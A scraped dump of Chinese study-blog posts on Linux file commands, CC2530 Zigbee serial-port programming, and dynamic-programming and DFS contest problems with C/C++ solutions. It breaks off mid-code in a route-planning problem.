相关命令用法1234561. ls -lh [文件名] #查看文件详细信息2. -d # 选项，当前的文件夹，不包括文件夹内部文件信息3. du -sh [文件夹名] # 查看目录大小 Disk usage 磁盘使用情况。-s 不包括子目录 相关经验 Linux 下，你会发现，很多文件，或则文件夹是有颜色的，啥意思呢？ 红色 — 压缩包，以 .tar.gz 结尾的为压缩文件。 蓝色 — 目录，也就是文件夹。 浅蓝色 — 符号链接（快捷方式），后面带一个 -&gt; 箭头。 绿色 — 为可执行文件。 黑色 — 普通文件，可以 cat 进行查看。 黑底黄字 — 设备文件，硬盘 sda。 紫色 — 图片、模块文件、等等……","link":"","tags":[{"name":"Linux","slug":"Linux","permalink":"http://www.fangning.xyz.com/tags/Linux/"}]},{"title":"串口","date":"2020-10-18T16:00:00.000Z","path":"2020/10/19/2020.09.28 串口/","text":"zigbee USB转串口驱动安装1234567891011121. 连接方法: 1) 通过数据线，直接连接 笔记本电脑 与 胜达电子学习板。 2) 学习板串口位置，会连接一个 PL-2303 USB 转串口芯片。 3) 此时的计算机还不能识别该设备，需要安装该芯片的驱动。2. 安装 PL-2303 驱动程序: 1) 安装驱动之前，需要卸&#x27;载掉并且删除&#x27;掉原来的串口驱动程序。 * 在设备管理器页面，找到端口，然后右击卸载并且删除驱动。 * 这一步必须删除干净，不然驱动程序会安装失败。 2) 双击 &#x27;PL-2303 Driver Installer Program&#x27; 驱动程序，一直下一步进行安装。 3) 安装完成后，查看设备管理器端口，会看到有&#x27;Prolific USB-to-Serial Comm Port (COM4)&#x27; 串口 工作环境，必须是32M晶振条件下。因此，使用串口功能的时候，必须改变 Zigbee 的工作晶振。 由 16MHz内部RC震荡电路 转换到 32MHz外部晶振 时钟配置代码： 12345678910void Cfg32M(void)&#123; SLEEPCMD &amp;= 0xfb; // 1111 1011 开启两个高频时钟沿 while((SLEEPSTA &amp; 0x40)==0); // 判断第四位是否为 1，为 1 的话稳定，等待 32 M 稳点 //delayms(); 此处延时 62us ，不延时也可以 CLKCONCMD &amp;= 0xf8; //1111 1000 后三位清零 不分频输出 CLKCONCMD &amp;= 0xbf; // 1011 1111 设置 32M 作为系统主时钟 while(CLKCONCMD &amp; 0x40); // 等待 32M 成功成为当前系统主时钟 SLEEPCMD |= 0x40; // 0000 0100&#125; 串口通讯：串口按位(bit)发送，和接收字节。 典型的：串口用于 ASCII 码字符的传输。通讯使用3根线完成，分别是地线、发送、接收。 通讯方式：异步通讯。 主要参数：波特率、数据位、停止位、奇偶校验。 波特率：符号的传输速率，24000 bit/s = 240 * 10 bit/s 每秒钟传 240个字符，一个字符 10 位。 8个数据位，一个起始位，一终止位。 串口配置的步骤 指定串口的 IO 位置； CC2530 具备 2 个串口； 每个串口又同时具有两个备用位置。 串口 0： Tx—-P03 与 Rx—–P02 Tx—-P15 与 Rx—–P14 串口 1： Tx—-P04 与 Rx—–P5 Tx—-P06 与 Rx—–P17 修改寄存器 PERCFG 的第 0 位 为 0 ，则选择串口 0 进行工作。 PERCFG &amp;= ~(0x01&lt;&lt;0); 为 1 ，则选择串口 1 进行工作。 PERCFG |= (0x01&lt;&lt;0); 响应 IO 配置成片上外设功能； 因为引脚所连接的串口功能，属于片上外设。所以需要配置相应引脚寄存器 PxSEL 为 1。 串口0，串口1 的备用 位置1 都在 P0 组。备用 位置2 都在 P1 组。 P0SEL |= 0x0C; 将 串口0 备用 位置1 所连接引脚设备片上外设的串口功能。 8个数据位、1个停止位、无流控、无校验确立； U0CSR |= 0xC0; 只管这样子配置的寄存器就行了，别纠结为啥这样配置。 设置波特率； 查表，了解到，如果要配相应波特率，该如何设置的控制变量 UxGCR 和 UxBAUD U0GCR = 11; U0BAUD = 216; 这样子实现了将波特率配置成115200 bps 起始到目前为止，这样子配置就已经建立了 zigbee 与 计算机 之间的串口通信甬道了。 以下，介绍一些常用的数据传送方式。 串口配置代码代码： 12345678void CfgSerPorCfg(void) //配置串口 configuration serial port&#123; PERCFG &amp;= ~(0x01&lt;&lt;0); //选择串口0，的备用位置1 P0SEL |= 0x0C; //将Tx,RX连接的 P03和P02 配置位片上外设 U0CSR |= 0xC0; //设置数据帧格式 U0GCR = 8; //配置波特率为 9600bps U0BAUD = 59;&#125; 串口通信 相关知识点总结： Zigbee 串口通信都是一次传送一个字符的。也即是一个 char 数据类型。 Zigbee 串口通信，发送 或者是 接受，都需要经过数据缓冲寄存器 UxDBUF，其中 x 为 0 或者 1 ，却决于采用串口0，还是串口1。 UxDBUF 不是一个寄存器，而是两个名称相同的寄存器。一个用来接收数据，一个用来发送数据。 当我们对 UxDBUF 读取的时候，默认是用到了接受数据的那个 UxDBUF 当我们对 UxDBUF 赋值的时候，默认是用到了发送数据的那个 UxDBUF 既然有数据缓冲寄存器，那么如何判断，缓冲寄存器的数据是否得到了数据，或者将缓冲区数据刷新到了串口进行发送了呢？ 这就另外引入两个标志位。UxRXIF 和 UxTXIF UxRXIF：如果数据缓冲寄存器得到串口的数据，那么该标志位被系统置 1。 UxTXIF：如果数据缓冲寄存器的数据被刷入到串口，那么该标志位被系统置 1。 通过判断这两个寄存器，可以得出我们的数据是否被接收到，或者发送出了。 我们一般如何将 Zigee 的数据通过串口发送到笔记本？ 先做好串口初始化配置，参照上文步骤。 然后对 数据缓冲寄存器 UxDBUF 赋值（接受 char 类型的数据）就行了。U0DBUF = ‘a’ 等待标志位 UxTXIF 自动变成1，表示数据发送成功了。while(U0TIF == 0); 然后，将标志位清零，为下一次发送字符做准备。U0TXIF = 0; 1234567891011121314#include &lt;cc2530.h&gt;void main()&#123; Cfg32M(); CfgSerPor(); // 通过串口，发送字符串 &quot;I LOVE YOU!&quot; char str[20] = &quot;I LOVE YOU!&quot;; int i = 0; while( str[i]!=&#x27;\\0&#x27; )&#123; U0DBUF = str[i++]; while( U0TXIF == 0 ); U0TXIF = 0; &#125;&#125; 我们一般如何接收串口发送过来的数据？ 串口接受到的数据在寄存器 UxDBUF 中，同时标志位 UxRXIF 会被系统置1。 首先得判断串口是否有数据传送过来，我们总不能用程序一直进行循环判断吧。要是能够采用中断查询就好了，这样，等待有数据从串口传送过来，程序才进行处理。Zigbee协议栈中，就有这种系统中断！😁下面介绍，如何用中断查询串口数据。 开串口接受数据中断（这是一个比较长的中断名字😂） 第一步，开 CPU总中断。 EA = 1。 第二步，开系统中的串口接收数据中断（顾名思义，就是接受到来自串口的数据，触发的中断）。 使能寄存器为：URX0IE = 1，如果是串口1的话就是用 URX1IE 然后写中断处理函数。如何处理得到的数据。 设置串口接受数据中断处理函数向量 #pragma vector = URX0_VECTOR 中断查询代码： 123456789101112131415161718192021222324#include &lt;cc2530.h&gt;void main(void)&#123; Cfg32M(); //一定要工作在 32M 晶振频率下 CfgSerPor(); //配置串口0的备用位置1 // 配置 串口0接收数据中断 EA = 1; //开CPU总中断 URX0IE = 1; //把串口0接受数据中断打开。&#125;#pragma vector = URX0_VECTOR //串口0接收数据中断向量__interrupt void SerialPortInt(void) //串口0接收数据中断处理函数&#123; //接受数据 char ch; ch = U0DBUF; //拿数据 URX0IF = 0; //数据拿走了，可以清除标志位了，为下一次接收做准备。 //处理拿到的数据 ch += 1; //随意改变以下 U0DBUF = ch; //然后发送出去 while(UTX0IF == 0); //等待数据发送成功。 UTX0IF = 0; //发送完毕，清除发送成功的标志位，为下一次发送做装备。&#125;","link":"","tags":[{"name":"zigbee","slug":"zigbee","permalink":"http://www.fangning.xyz.com/tags/zigbee/"}]},{"title":"DP动态规划","date":"2020-10-15T09:26:30.000Z","path":"2020/10/15/2020.10.15 DP/","text":"样例1：铺满 2*N 方格描述杭电题目链接 在2×n的一个长方形方格中,用一个1× 2的骨牌铺满方格,输入n ,输出铺放方案的总数. 输入输入数据由多行组成，每行包含一个整数n,表示该测试实例的长方形方格的规格是2×n (0&lt;n&lt;=50)。 输出对于每个测试实例，请输出铺放方案的总数，每个实例的输出占一行。 样例12345678输入：1350输出：1320365011074 代码1234567891011121314#include &lt;stdio.h&gt;typedef long long ll;ll f[51];int main()&#123; int n; f[0] = f[1] = 1; for( int i = 2; i &lt;= 50; i++ ) f[i] = f[i-1] + f[i-2]; while( scanf(&quot;%d&quot;, &amp;n) != EOF ) printf( &quot;%lld\\n&quot;, f[n] ); return 0;&#125; 思路 f[i] 表示放满第 i 列的方法数。 考虑第 i 列 要么横着放置两个，方法数 = f[i-2]。影响范围最远扩散到 i-2 要么竖着放置一个，方法数 = f[i-1]。影响范围最远扩散到 i-1 结合两者情况，得到递推式 f[n] = f[n-1] + f[n-2] 总结 将一个大问题，分解成两个，或者多个子问题。假设，子问题的答案以已知。 如何确定大问题? 在一维dp 中，最终需要求解的就是大问题。 如果是多维dp，大问题就是当前维度的所有情况。 小问题就是，把当前维度的所有情况往前递推。 具体参考下一个样例进行理解。 如何确定小问题？ 分情况考虑大问题，最终会将范扩散到如求解小问题。 比如，此题，考虑到第 n 列可以有两种情况。分别需要用到 f[n-1] 和 f[n-2]。 得到递推式。 f[n] = f[i-1] + f[i-2] 确定边界值。 考虑推式的边界情况。f[2] = f[1] + f[0] 。 易知 f[2] = 2 ， f[1] = 1 。那么 f[0] = f[2] - f[1] = 1 此时，初始化打表时，需要将 f[0] 置 1 样例2：铺满 3*N 方格题目描述题目 将上一个题目的描述改成，在 3*N 的长方形中，铺满 1 * 2 大小的骨牌。 样例12345678910111213输入：12341000输出：0301174979 思路 当每一列的长度变成 3 的时候，我们再来考虑最多第 n 列的大问题，如果用一维的分解思路，并不能推出所有的子问题。比如下面n=4时，下面两种情况: 这种情况下 f[4] 并不能完全分解为 f[2] 或者 f[1] 两种情况，因为有些方块可能跨越两列。这时就需要用到二维的dp，增加一个维度的参数。比如 f[ i ] [ j ] 表示，铺满 i 列，多余 j 个。 此时，因为维度改变了，所以我们需要求的大问题是所有的 f[i] ，也就是 f[ j ] [ 0 ] ， f[ j ] [ 1 ]， f[ j ] [ 2 ] 通过每一个大问题得到一个递推式： f[ i ] [0] ：铺满 i 列后，一个都不剩。可由三种子问题推出： f[ i-2 ] [0] + 3横放骨牌 f[ i-2 ] [2] + 1横 + 1竖着 f[ i-1 ] [2] + 1竖 f[ i ] [1] : 铺满 i 列后，还多一个方格。可由一种子问题推出： f[ i-1 ] [2] + 1横 f[ i ] [2]：铺满 i 列后，还多出两个方格。可由两种子问题推出： f[ i ] [0] + 1竖 f[ i-1] [1] + 2横 最终递推式： 123f[i][0] = f[i-2][0] + f[i-2][2] + f[i-1][1];f[i][1] = f[i-1][2];f[i][2] = f[i][0] + f[i-1][1]; 确定边界： 每个递推式，都需要用到前一行，或者两行。 所以需要预先确定二维数组最前面的两行值。 12f[0][1] = f[1][0] = f[1][2] = 0;f[0][0] = f[0][2] = f[1][1] = 1; 代码123456789101112131415161718192021222324252627282930313233#include&lt;stdio.h&gt;const int M = 1e5+3; //答案对 M 取模int f[10005][3];void work()&#123; f[0][1] = f[1][0] = f[1][2] = 0; f[0][0] = f[0][2] = f[1][1] = 1; for( int i = 2; i &lt;= 1000; i++ ) &#123; for( int j = 0; j &lt; 3; j++ ) &#123; switch(j)&#123; case 0: f[i][j] = (f[i-2][0] + f[i-2][2] + f[i-1][1])%M; break; case 1: f[i][j] = f[i-1][2]; break; case 2: f[i][j] = (f[i][0] + f[i-1][1])%M; break; &#125; &#125; &#125;&#125;int main()&#123; int n; work(); // 打表 while( scanf(&quot;%d&quot;, &amp;n) != EOF ) &#123; if( n%2 != 0 ) printf( &quot;0\\n\\n&quot; ); // 如果 3*n ， n 为奇数， 那么总面积为奇数，不可能是 1*2 的倍数。 else printf( &quot;%d\\n\\n&quot;, f[n][0] ); &#125; return 0;&#125; 总结 一维解决不了的时候，想想如何多加一个参数，形成二维。 二维的大问题不止一个，因此，递推式也不止一个。 样例3：数的划分链接：https://ac.nowcoder.com/acm/problem/16695来源：牛客网 将整数n分成k份，且每份不能为空，任意两个方案不能相同(不考虑顺序)。 例如：n=7，k=3，下面三种分法被认为是相同的。 1，1，5; 1，5，1; 5，1，1; 问有多少种不同的分法。 输入：n，k ( 6 &lt; n ≤ 200，2 ≤ k ≤ 6 ) 输出：一个整数，即不同的分法。 输入描述:1两个整数 n,k ( 6 &lt; n ≤ 200， 2 ≤ k ≤ 6 ) 输出描述:11个整数，即不同的分法。 示例1输入17 3 输出14 思路 刚拿到这题，第一想法是用 dfs，但是不知道咋去掉重复的情况了。看题解用动态，然而递推式让我感觉很迷啊，为毛会想得到用这种递推式？？？？？？:sob: 首先确定大问题：将 n 分成 k 份。 然后如何确定小问题呢？ 小问题的解的和，一定要包含大问题所有的情况。在这里，用到了一个很巧妙的分解方法。也就是一下两个子问题。 子问题一：将 n 分成 k 份，每一份都 &gt; 0。如果我们假设每一份都 &gt; 1 ，那么问题就变成了将 n-k 份成 k 份。因为，每一份都至少有一个1，所以用到了k，只需要再份 n-k 就行了。另外，因为每一份都要大于1，所以剩下的 n-k 还得分到 k 份当中。 子问题二：将 n 分个1出来，单独作为1份，将剩下的 n-1 分成 k-1 份。我靠，为啥要这样子分？？？因为，子问题1中，我们假设每一份都大于1了，那么还有等于1的情况没有考虑，所以我们需要加上至少有1份等于1的情况，这样才能保证完整性，不遗漏。 设 dp[ i ] [ j ] 表示，将数 i 划分成 j 份。我们所求即为 dp[ n ] [ k ] 递推公式：dp[ i ] [ j ] = dp[ i-j ] [ j ] + dp[ i-1 ] [ j-1 ] 总结 我们在确定小问题的时候需要注意 子问题一定要是二位数组之前的量。比如 dp[ i ] [ j ] 大问题，子问题一定要从该位置的上方，或者前方找。 划分子问题时 子问题所有解的集合，一定要是大问题所有解。不能有情况遗漏。 动态规划问题，最难就难在找不到如何正确找到划分大问题的办法。 我们在思考将 n 个数分解成 k 个数的时候。需要思考分解的特点。 要么每一份都大于 1 ， 要么 至少有一份等于1。这样就分解成两个子问题了。这涉及到高中的组合数的知识。 代码12345678910111213141516171819202122232425#include &lt;cstdio&gt;int dp[201][8];int main()&#123; int n, k; scanf(&quot;%d%d&quot;, &amp;n, &amp;k); for(int i = 0; i &lt;= n; i++)&#123; dp[i][1] = 1; // 将一个数分成一份，那么只有一种情况 dp[i][0] = 0; // 将 0 进行划分，0 种情况。 &#125; for(int i = 0; i &lt;= n; i++) &#123; for(int j = 0; j &lt;= k; j++) &#123; if(i == j) // 将 i 划分成 i 份，只有一种分法 dp[i][j] = 1; else if(i &lt; j) // 将 i 划分为小于本身的份数，将无法划分，情况为0 dp[i][j] = 0; else dp[i][j] = dp[i-j][j] + dp[i-1][j-1]; // 大问题划分为两个子问题。 &#125; &#125; printf( &quot;%d\\n&quot;, dp[n][k] ); return 0;&#125; 样例4：删括号链接：https://ac.nowcoder.com/acm/problem/21303来源：牛客网 题目描述 给你一个合法的括号序列s1，每次你可以删除一个”()” 你可以删除0个或者多个”()” 求能否删成另一个括号序列s2 输入描述:12第一行输入一个字符串s (2 ≤ |s| ≤ 100)第二行输入一个字符串t (2 ≤ |t| ≤ 100 ) 输出描述:12如果可以输出&quot;Possible&quot;否则输出&quot;Impossible&quot; 示例1输入12(())() 输出1Possible 示例2输入12(()())()() 输出1Impossible 备注:123子任务1: |s| &lt;= 10子任务2: |s| &lt;= 20子任务3: 无限制 思路 设 dp[ i ] [ j ] = true 表示 s1 中下标 0 ~ i-1 的字串，通过删除若干个 “()” ，可以得到 s2 中下标为 0 ~ j-1 的字串。 反之，如果 dp[ i ] [ j ] = false , 表示不能得到。 dp 类型为 bool 二维数组。 我们需要求出二维数组 dp 的每一行，在求第 i 行、第 j 列的时候，前面第 0 ~ i-1 行都是已知状态，可以利用前面来推导当前的状态。 将 s1 的第 i 个字符，和 s2 的第 j 个字符进行比较，会有几种情况发生： 情况1：两者不同： 如果 s1 此时为 左括号，那就先不管，因为此时无法进行删除 “()” 一组括号。dp[ i ] [ j ] 默认为 false 如果 s2 此时为 右括号，那就进行删除 “()” 操作，删除成对数量的 “()” ，dp[ i ] [ j ] 的状态，就等于 dp[ i-k ] [ j ] 的状态。其中，k 表示进行删除操作后，i 值向前的偏移量。这样子，就实现了将问题向前推的转化。 情况2：两者相同： 两者相同的话，dp[ i ] [ j ] 状态，直接就是， dp[ i-1 ] [ j-1 ]。 但是，如果 s1 此时为右括号仍然需要进行删除 “()” 操作。排除 dp[ i-1 ] [ j-1 ] 为 false ，但是删除若干个 “()” 后，dp[ i-k ] [ j ] 为真的情况。 总结 对于 “()” 括号对合法的字符串，可以从一端删除数量相同的左括号，与右括号。 得到的字符串，必然还是成对合法的”()”字符串。 :sob: 我是菜鸡，这种题解析看得都不是很懂，更别所独立想到用 dp 做出来了，哎…… 代码12345678910111213141516171819202122232425262728293031323334353637#include &lt;iostream&gt;#include &lt;cstdio&gt;#include &lt;cstdlib&gt;#include &lt;string&gt;#include &lt;cstring&gt;using namespace std;int main()&#123; string s1; string s2; cin &gt;&gt; s1 &gt;&gt; s2; int len1 = s1.length(); int len2 = s2.length(); bool dp[105][105]; memset(dp, false, sizeof(dp)); dp[0][0] = true; for( int i = 1; i &lt;= len1; i++ ) &#123; for( int j = 1; j &lt;= len2; j++ ) &#123; if(s1[i-1] == s2[j-1]) dp[i][j] |= dp[i-1][j-1]; if(s1[i-1] == &#x27;)&#x27;)&#123; int cnt = 1; int k = i; while(cnt)&#123; if(s1[k-1]==&#x27;)&#x27;) cnt++; else cnt--; k--; &#125; dp[i][j] |= dp[k][j]; &#125; &#125; &#125; if(dp[len1][len2]) cout &lt;&lt; &quot;Possible&quot; &lt;&lt; endl; else cout &lt;&lt; &quot;Impossible&quot; &lt;&lt; endl; return 0;&#125; 样例5：划分题目描述：小河认为一个数组是强大的，当且仅当其中所有数字的和不小于 l 且不大于 r。 他得到了一个长度为 n 的数组，希望从中划分出若干个强大的连续子数组。比如，对于数组 [1,−2,−3,4] 以及 l=r=1，可以划分出 [1],[−3,4] 两个满足条件的强大的连续子数组。 小河是贪心的。他希望知道，对于给定的数组，最多能够划分出多少个强大的连续子数组。注意，并不一定要用到数组中的每一个数。 输入格式本题包含多组数据。 第一行一个整数 T(1≤T≤5×103) 表示数据组数。 对于每组数据，第一行三个数字n,l,r(1≤n≤5×103,−109≤l≤r≤109)，表示数组长度和强大的数组所要求的和的最小值及最大值。 接下来一行包含数组中的n个数字a1,a2,…,a**n(∣a**i∣≤109)。 题目保证 ∑n≤5×103。 输出格式对于每组数据，输出一行一个整数，即最多能分割出的强大子数组的个数 样例输入123110 2 10-1 2 -3 4 -5 6 -7 8 -9 10 样例输出15 思路这道题用动态规划，假设我们以及知道 [1, i-1] 区间最大的划分数 dp[i-1] 为多少。 那么 dp[i] 至少会有 dp[i-1] 这么多。 再考虑多出的数字 a[i] 能不能组成新的满足条件的分组。也就是枚举以 a[i] 结尾的连续区间有哪些？我们可以枚举所有可能的左端点 1 到 i-1 。组成区间 [1, i] 或 [2, i] 或 [3, i] … [i-1, i] 。 然后计算每个区间的和，是否满足条件。如果满足条件，那么说明我们需要这个区间，组成一种划分情况。dp[i] 可能等于 dp[j-1] + 1 ， 其中，dp[j-1] 是除去最后一个区间，数组剩余数字能够得到的最大划分数。 j 从 1-i ，计算每种情况所得到的结果，取最大值，就是 dp[i] 总结动态规划，很多时候，一维dp。主问题，可能会引出 i-1 个子问题。不是对于每一个子问题都要写一个转移公式。 而是，循环判断每一个子问题所得到的结果。拿出来做比较，得到最大的，最优的那一个，就是我们所需要的主问题答案。 所以，一般一维dp，也会嵌套循环两个 for 代码12345678910111213141516171819202122232425262728293031323334#include &lt;bits/stdc++.h&gt;using namespace std;typedef long long ll;const int N = 5e3+10;ll p[N];ll a[N];int dp[N]; // 1-i 区间的数组，最多的划分数int main()&#123; int t; int n, l, r; scanf(&quot;%d&quot;, &amp;t); while(t--) &#123; scanf(&quot;%d%d%d&quot;, &amp;n, &amp;l, &amp;r); for(int i = 1; i &lt;= n; i++) &#123; scanf(&quot;%lld&quot;, &amp;a[i]); p[i] = p[i-1]+a[i]; //预处理出前缀和，方便得到区间和 &#125; for(int i = 1; i &lt;= n; i++) &#123; dp[i] = dp[i - 1]; for(int j = 1; j &lt;= i; j++) //判断 [j-i] 区间是否满足条件 &#123; ll tmp = p[i] - p[j-1]; if(tmp &gt;= l &amp;&amp; tmp &lt;= r) /// 如果满足，求最大 dp[i] = max(dp[i] , dp[j-1]+1); &#125; &#125; printf(&quot;%d\\n&quot;, dp[n]); &#125; return 0;&#125; 相关参考链接一篇比较详细的入门介绍 有关数的划分（dp）各种变式","link":"","tags":[{"name":"ACM","slug":"ACM","permalink":"http://www.fangning.xyz.com/tags/ACM/"}]},{"title":"DFS","date":"2020-10-07T11:43:30.000Z","path":"2020/10/07/2020.10.07 DFS深搜/","text":"题1 ：送外卖链接：https://pre.ac.nowcoder.com/acm/problem/13224来源：牛客网 时间限制：C/C++ 1秒，其他语言2秒 空间限制：C/C++ 32768K，其他语言65536K 64bit IO Format: %lld 题目描述n 个小区排成一列，编号为从 0 到 n-1 。一开始，美团外卖员在第0号小区，目标为位于第 n-1 个小区的配送站。 给定两个整数数列 a[0]a[n-1] 和 b[0]b[n-1] ，在每个小区 i 里你有两种选择： 选择a：向前 a[i] 个小区。 选择b：向前 b[i] 个小区。 把每步的选择写成一个关于字符 ‘a’ 和 ‘b’ 的字符串。求到达小区n-1的方案中，字典序最小的字符串。如果做出某个选择时，你跳出了这n个小区的范围，则这个选择不合法。• 当没有合法的选择序列时，输出 “No solution!”。• 当字典序最小的字符串无限长时，输出 “Infinity!”。• 否则，输出这个选择字符串。 字典序定义如下：串s和串t，如果串 s 字典序比串 t 小，则• 存在整数 i ≥ -1，使得∀j，0 ≤ j ≤ i，满足s[j] = t[j] 且 s[i+1] &lt; t[i+1]。• 其中，空字符 &lt; ‘a’ &lt; ‘b’。 输入描述:12345输入有 3 行。第一行输入一个整数 n (1 ≤ n ≤ 10^5)。第二行输入 n 个整数，分别表示 a[i] 。第三行输入 n 个整数，分别表示 b[i] 。−n ≤ a[i], b[i] ≤ n 输出描述:1输出一行字符串表示答案。 示例1输入12375 -3 6 5 -5 -1 6-6 1 4 -2 0 -2 0 输出1abbbb 思路 刷题的时候，牛客把这题归类到 BFS。但是实际上用 DFS 最佳。 如何达到字典序列最小？ 如果是广搜，需要比较每次搜索结果得到的字符串大小。bfs搜索过程: a, b, aa, ab, ba, bb, aba, abb, baa, bab……. 如果是用深搜，第一次搜索到的结果就是最优的。dfs过程: aaaaa, aaaab, aaaa, aaab, aaa, aab……… 显然，直接用深搜。 如何判断是否存在最优答案是无限长的？ 如果一个点结果两次，并且能达到最后的终点，那就是答案无限长。比如: aaaaaaaa…aaaab 加各 vis[] 数组，统计结果点的次数就好了。 AC代码12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152#include&lt;bits/stdc++.h&gt;using namespace std;const int N = 1e5+5;int a[N], b[N], vis[N]; // vis 用来标记搜索经过次数int n;string ans; // 记录字典序最优的答案bool f = false; // 判断是否有环，有 true ， 无 falsebool dfs( int pos ) //当前位置 pos&#123; if(pos &lt; 1 || pos &gt; n) return false; //先判是否超界 if(pos == n) // 再判当前位置是否满足条件 return true; if(vis[pos] &gt; 1) return false; // 在判到达当前位置时，是否形成了环 vis[pos]++; // 统计经过该 pos 次数 if( dfs(pos + a[pos]) )&#123;// 遍历另外两位置，如果子路径搜索到答案了，那么父路径返回 true ans += &#x27;a&#x27;; if(vis[pos] &gt; 1) f = true;//子路径递归结束后，再判断该点经过的次数，大于1次拿肯定有环 return true; &#125; if( dfs(pos + b[pos]) )&#123; ans += &#x27;b&#x27;; if(vis[pos] &gt; 1) f = true; return true; &#125; return false; // 以上所有情况都没能返回 true，所以不存在路径。&#125;int main()&#123; scanf(&quot;%d&quot;, &amp;n); for(int i = 1; i &lt;= n; i++) scanf(&quot;%d&quot;, &amp;a[i]); for(int i = 1; i &lt;= n; i++) scanf(&quot;%d&quot;, &amp;b[i]); if( dfs(1) ) //是否可以搜索到最后一个小区？ &#123; if(f) puts(&quot;Infinity!&quot;); //搜索过程中是否经历一个小区两次及以上？ else &#123; reverse(ans.begin(), ans.end()); cout&lt;&lt;ans&lt;&lt;endl; &#125; &#125; else puts(&quot;No solution!&quot;); return 0;&#125; 代码解释 string 类字符串的逆转方法： reverse( string.begin(), string.end() ); 执行完该语句后，string 字符串被逆转。 为什么要将答案逆转输出？ 因为递归时，最外层的函数，最后才结束。 所以，ans 在赋值的时候，是从搜索末端，赋值到搜索开始层。所以答案是反的。 递归的思想，看上去很难，实际上我们只需要在意最外层，也就是当前节点所在位置的判断就行了。 就像 动态规划一样，一个大的问题，可以由两个小子问题得到。 搜索中，当前层次的结果，由多个下一层的搜索结果返回。 题目2：周游世界pta题目链接30分 题解参考链接 题目描述周游世界是件浪漫事，但规划旅行路线就不一定了…… 全世界有成千上万条航线、铁路线、大巴线，令人眼花缭乱。所以旅行社会选择部分运输公司组成联盟，每家公司提供一条线路，然后帮助客户规划由联盟内企业支持的旅行路线。本题就要求你帮旅行社实现一个自动规划路线的程序，使得对任何给定的起点和终点，可以找出最顺畅的路线。所谓“最顺畅”，首先是指中途经停站最少；如果经停站一样多，则取需要换乘线路次数最少的路线。 输入格式：输入在第一行给出一个正整数N（≤100），即联盟公司的数量。接下来有N行，第i行（i=1,⋯,N）描述了第i家公司所提供的线路。格式为： M S[1] S[2] ⋯ S[M] 其中M（≤100）是经停站的数量，S[i]（i=1,⋯,M）是经停站的编号（由4位0-9的数字组成）。这里假设每条线路都是简单的一条可以双向运行的链路，并且输入保证是按照正确的经停顺序给出的 —— 也就是说，任意一对相邻的S[i]和S[i+1]（i=1,⋯,M−1）之间都不存在其他经停站点。我们称相邻站点之间的线路为一个运营区间，每个运营区间只承包给一家公司。环线是有可能存在的，但不会不经停任何中间站点就从出发地回到出发地。当然，不同公司的线路是可能在某些站点有交叉的，这些站点就是客户的换乘点，我们假设任意换乘点涉及的不同公司的线路都不超过5条。 在描述了联盟线路之后，题目将给出一个正整数K（≤10），随后K行，每行给出一位客户的需求，即始发地的编号和目的地的编号，中间以一空格分隔。 输出格式：处理每一位客户的需求。如果没有现成的线路可以使其到达目的地，就在一行中输出“Sorry, no line is available.”；如果目的地可达，则首先在一行中输出最顺畅路线的经停站数量（始发地和目的地不包括在内），然后按下列格式给出旅行路线： 123Go by the line of company #X1 from S1 to S2.Go by the line of company #X2 from S2 to S3....... 其中Xi是线路承包公司的编号，Si是经停站的编号。但必须只输出始发地、换乘点和目的地，不能输出中间的经停站。题目保证满足要求的路线是唯一的。 输入样例：1234567891047 1001 3212 1003 1204 1005 1306 77979 9988 2333 1204 2006 2005 2004 2003 2302 200113 3011 3812 3013 3001 1306 3003 2333 3066 3212 3008 2302 3010 30114 6666 8432 4011 130643011 30136666 20012004 30012222 6666 输出样例：12345678910112Go by the line of company #3 from 3011 to 3013.10Go by the line of company #4 from 6666 to 1306.Go by the line of company #3 from 1306 to 2302.Go by the line of company #2 from 2302 to 2001.6Go by the line of company #2 from 2004 to 1204.Go by the line of company #1 from 1204 to 1306.Go by the line of company #3 from 1306 to 3001.Sorry, no line is available. 思路 题目大意就是很多条地铁线，每条地铁线会经过地铁站。两条相交的地铁线中间的交点站，可以更换线路，也即是换成。要求从起始地，到目的地。经过的地铁站数最少，如果多条线路到达时经过的地铁站数目一样多，那就比较换乘的次数（需要最少）。 题目输出很麻烦，需要记录路径所经过的地铁线编号，以及地铁站编号。 如果没有可达的线路，需要输出指定的字符串。 dfs 函数三参数，起点，终点，以及经过的地铁站数。 每次递归，地铁站数目 + 1。 经过的地铁站，用 vis 数组标记，下次就别搜索了。 递归出口，起点 == 终点，用 cnt 更新全局 minCnt。 如果，cnt == minCnt 比较换乘次数，与minTran最小换乘次数大小。 如何得到换乘次数呢？需要我们搜索过程中，记录中间路径。 也即是用 vector 每次添加经过的地铁站编号。递归结束后在 .pop_back() 删掉。 这样保证每一次到达递归出口，都有一个唯一的线路 vector 。 我们需要最优线路，所以需要弄个最终 path 来保存。该值可以动态更新，和 minCnt , minTran一样。vector 对象之间可以直接用 = 号赋值。 如何存储地铁线路呢？图的存储一般两种，接邻矩阵，接邻表。 接邻矩阵开销大，对于离散的点，不好存。所以用接邻表。 接邻表要用指针，太麻烦。所以直接用 c++ 容器 vector 类型的数组。vectorv[maxn] 声明符 [] 决定了 v 是一个数组，类型符 vector 标识数组每一个元素是一个 vector 类型的对象。 这样子，v[pos] 标，表示每一个地铁站编号，元素值表示与该地铁站相连的其他若干个地铁站编号。 与接邻表一个意思。 如何知道，两个地铁站之间的边，是属于哪一条地铁线呢？ 用 map 做映射，将两条端点的编号弄进去，映射出一个地铁线编号。 map只能做 1对1映射，2对1不行，所以需要将两个数字 hash 映射成一个数字。 如何 hash？数字1作为高四位，数字2作为低四位，就组成了唯一的一个8位数字了。 总结 可以用二维 vector 模拟接邻表。 可以自定义一种 hash 映射方法，配合 map 映射。将离散的节点，变成不离散的节点。 代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137#include &lt;bits/stdc++.h&gt;#include &lt;cmath&gt;#define mem(a, b) memset( a, b, sizeof(a) )#define ssclr(ss) ss.clear(),ss.str(&quot;&quot;)#define f(x, y, z) for( int x = (y), __ = (z); x &lt; __; ++x )#define INF 0x3f3f3f3f#define MOD 1000000007//namespace solve&#123; &#125;using namespace std;typedef long long ll;const int maxn = 1e4+10;int minCnt, minTran; // 两个代价，都需要最小int vis[maxn]; //搜索表记数组unordered_map&lt;int, int&gt; Line;vector&lt;int&gt; v[maxn], tpath, path;int ToLine(int x, int y); // hash 映射边int TranCnt(); // 计算路径换乘次数// 搜索出最优路径，保存到 path 中。中间过程存放到 tpath。// 使用二维 